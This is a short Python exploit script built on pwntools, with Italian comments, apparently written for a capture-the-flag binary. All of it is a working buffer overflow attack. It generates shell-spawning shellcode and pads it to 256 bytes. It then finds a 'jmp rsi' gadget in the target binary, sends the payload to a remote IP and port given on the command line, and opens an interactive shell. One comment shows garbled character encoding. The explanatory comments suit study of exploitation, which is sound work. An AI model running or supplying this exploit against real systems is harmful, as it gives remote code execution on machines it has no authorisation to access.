from pwn import *

if len(sys.argv) != 4:
	print("Usage example: $python3 exploit.py [IP] [PORT] [BINARY]")
else:
	
	binary = sys.argv[3]
	
	# elf Ã¨ una variabile che rappresenta l'oggetto ELF del binario, consente di accedere a simboli, indirizzi e sezioni del binario
	elf = context.binary = ELF(binary, checksec=False)

	# genera uno shellcode scritto in assembly e poi compilato in codice macchina con asm() per ottenere una shell
	shell = asm(shellcraft.sh())
	
	# ricerca istruzione jmp rsi nel binario
	# elf.search() cerca una sequenza di codice (in assembly) all'interno del binario e ne restituisce l'indirizzo
	# next() ritorna il primo indirizzo trovato
	jmp_rsi = next(elf.search(asm('jmp rsi')))
	
	# concatenata i vari componenti del payload in un'unica stringa di byte
	# shellcode + a * (256 - lunghezza_shellcode) + indirizzo_memorizzato_rsi
	payload = flat(shell, b"a" * (0x100 - len(shell)), jmp_rsi)

	host = sys.argv[1]
	port = sys.argv[2]

	conn = remote(host, port)
	conn.send(payload)
	
	# sessione interattiva con la shell
	conn.interactive()
